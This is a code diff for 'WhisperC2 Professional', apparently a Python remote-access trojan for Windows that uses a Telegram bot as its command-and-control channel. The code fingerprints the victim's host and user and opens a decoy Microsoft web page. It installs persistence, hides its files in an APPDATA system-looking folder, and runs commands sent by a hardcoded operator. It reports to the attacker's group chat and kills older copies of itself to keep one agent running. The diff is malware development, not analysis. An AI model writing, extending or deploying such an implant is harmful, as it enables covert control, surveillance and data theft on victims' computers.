@@ -1,6 +1,7 @@
+```python
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Final Production Build (Telemetry + Crash Log)
+# WhisperC2 Professional – PID‑Based Override + Auto‑Topic Recreation
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -18,7 +19,7 @@ GROUP_CHAT_ID = -1003919074770
 DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"
 
 # -----------------------------------------------------------------------------
-# Early crash logger – writes to a file next to the executable
+# Early crash logger
 # -----------------------------------------------------------------------------
 def crash_log(msg):
     try:
@@ -26,19 +27,6 @@ def crash_log(msg):
             f.write(f"[{datetime.now()}] {msg}\n")
     except:
         pass
-
-# -----------------------------------------------------------------------------
-# Single‑instance mutex
-# -----------------------------------------------------------------------------
-MUTEX_NAME = "Global\\WhisperPro_Mutex"
-try:
-    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
-    if ctypes.windll.kernel32.GetLastError() == 183:
-        sys.exit(0)
-except Exception as e:
-    crash_log(f"Mutex creation failed: {e}")
-    sys.exit(1)
-atexit.register(ctypes.windll.kernel32.CloseHandle, mutex)
 
 # -----------------------------------------------------------------------------
 # Thread‑safe log buffer
@@ -55,20 +43,53 @@ def log(msg: str) -> None:
 # -----------------------------------------------------------------------------
 # Telegram bot
 # -----------------------------------------------------------------------------
-try:
-    bot = telebot.TeleBot(BOT_API_KEY)
-except Exception as e:
-    crash_log(f"telebot init failed: {e}")
-    sys.exit(1)
+bot = telebot.TeleBot(BOT_API_KEY)
 
 # -----------------------------------------------------------------------------
-# Immediate startup notification (plain text – always sent first)
+# Agent identity & persistence
 # -----------------------------------------------------------------------------
-def send_startup_ping():
-    try:
-        bot.send_message(GROUP_CHAT_ID, f"⚡ **{get_system_id()}** is starting…")
-    except:
-        pass
+appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
+agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
+os.makedirs(agents_dir, exist_ok=True)
+
+def get_system_id() -> str:
+    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
+    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
+    username = raw_user.split('\\', 1)[1] if '\\' in raw_user else raw_user
+    return f"{hostname}/{username}"
+
+SYSTEM_ID = get_system_id()
+HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]
+
+TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
+PID_FILE = Path(agents_dir) / "agent.pid"
+
+# -----------------------------------------------------------------------------
+# Kill old instance if any
+# -----------------------------------------------------------------------------
+def kill_old_instance():
+    if PID_FILE.exists():
+        try:
+            old_pid = int(PID_FILE.read_text().strip())
+            if old_pid == os.getpid():
+                return
+            handle = ctypes.windll.kernel32.OpenProcess(0x0001, False, old_pid)
+            if handle:
+                ctypes.windll.kernel32.TerminateProcess(handle, 0)
+                ctypes.windll.kernel32.CloseHandle(handle)
+                log(f"Killed old agent (PID {old_pid})")
+                time.sleep(0.5)
+        except:
+            pass
+        try:
+            PID_FILE.unlink()
+        except:
+            pass
+
+def save_pid():
+    PID_FILE.write_text(str(os.getpid()))
+
+atexit.register(lambda: PID_FILE.unlink(missing_ok=True) if PID_FILE.exists() else None)
 
 # -----------------------------------------------------------------------------
 # HTML5 Telemetry
@@ -91,16 +112,16 @@ def send_telemetry(topic_id, status: str) -> bool:
     if topic_id:
         try:
             bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
-            log(f"Telemetry HTML report sent to topic ({status})")
+            log(f"Telemetry HTML sent to topic ({status})")
             return True
-        except Exception as e:
-            print(f"Topic telemetry failed: {e}")
+        except:
+            pass
     try:
         bot.send_document(GROUP_CHAT_ID, bio)
-        log(f"Telemetry HTML report sent to main group ({status})")
+        log(f"Telemetry HTML sent to group ({status})")
         return True
-    except Exception as e:
-        print(f"Main group telemetry failed: {e}")
+    except:
+        pass
     plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([x['msg'] for x in log_lines[-10:]]) + "\n```"
     try:
         bot.send_message(GROUP_CHAT_ID, plain, parse_mode='Markdown')
@@ -109,23 +130,8 @@ def send_telemetry(topic_id, status: str) -> bool:
         return False
 
 # -----------------------------------------------------------------------------
-# Agent identity & persistence
+# Topic management (auto‑recreate if deleted)
 # -----------------------------------------------------------------------------
-appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
-agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
-os.makedirs(agents_dir, exist_ok=True)
-
-def get_system_id() -> str:
-    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
-    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
-    username = raw_user.split('\\', 1)[1] if '\\' in raw_user else raw_user
-    return f"{hostname}/{username}"
-
-SYSTEM_ID = get_system_id()
-HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]
-
-TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
-
 def load_topic_id() -> int | None:
     if TOPIC_ID_FILE.exists():
         try:
@@ -138,22 +144,26 @@ def save_topic_id(tid: int) -> None:
     TOPIC_ID_FILE.write_text(str(tid))
 
 def get_or_create_topic() -> int | None:
+    # 1. Try to reuse stored topic
     existing = load_topic_id()
     if existing:
         try:
             test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
             bot.delete_message(GROUP_CHAT_ID, test.message_id)
-            return existing
+            return existing          # stored topic still exists
         except:
-            pass
+            log("Stored topic not found – will create a new one")
+
+    # 2. Create a brand‑new topic (replaces the deleted one)
     try:
         new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
         tid = new_topic.message_thread_id
-        save_topic_id(tid)
+        save_topic_id(tid)           # overwrites the old invalid topic ID
+        log(f"Created new topic {tid}")
         return tid
     except Exception as e:
         log(f"Topic creation failed: {e}")
-        return None
+        return None                  # triggers main‑group fallback later
 
 def install_persistence() -> bool:
     if not getattr(sys, 'frozen', False):
@@ -377,13 +387,16 @@ def execute_command(cmd_line: str, topic_id):
 # Main
 # -----------------------------------------------------------------------------
 def main():
-    # ---------- CRASH‑PROOF STARTUP ----------
     try:
-        # 1. Send a minimal "I'm alive" right now
-        send_startup_ping()
+        # 1. Send minimal "alive" ping
+        bot.send_message(GROUP_CHAT_ID, f"⚡ **{SYSTEM_ID}** is starting…")
         log("Startup ping sent")
 
-        # 2. Full normal startup
+        # 2. Kill old instance if running & save our PID
+        kill_old_instance()
+        save_pid()
+
+        # 3. Normal startup
         install_persistence()
         log("Persistence done")
 
@@ -394,16 +407,13 @@ def main():
             time.sleep(2)
 
         if not topic_id:
-            log("Could not create forum topic – falling back to main group (with hostname filter)")
+            log("Could not create forum topic – falling back to main group")
             topic_id = None
-            try:
-                bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")
-            except:
-                pass
+            bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")
 
         log(f"Agent ID: {SYSTEM_ID}, Topic: {topic_id if topic_id else 'main (filtered)'}")
 
-        # 3. Define handler (same as before, unchanged)
+        # 4. Handler (unchanged)
         def _handler_wrapper(message):
             if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
                 return
@@ -462,7 +472,6 @@ def main():
         bot.infinity_polling(timeout=30, long_polling_timeout=30)
 
     except Exception as fatal:
-        # Catch EVERY crash and write to disk + attempt Telegram message
         crash_log(f"Fatal error: {traceback.format_exc()}")
         try:
             bot.send_message(GROUP_CHAT_ID, f"🔥 **{SYSTEM_ID}** crashed on startup: {fatal}")
@@ -471,3 +480,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+```
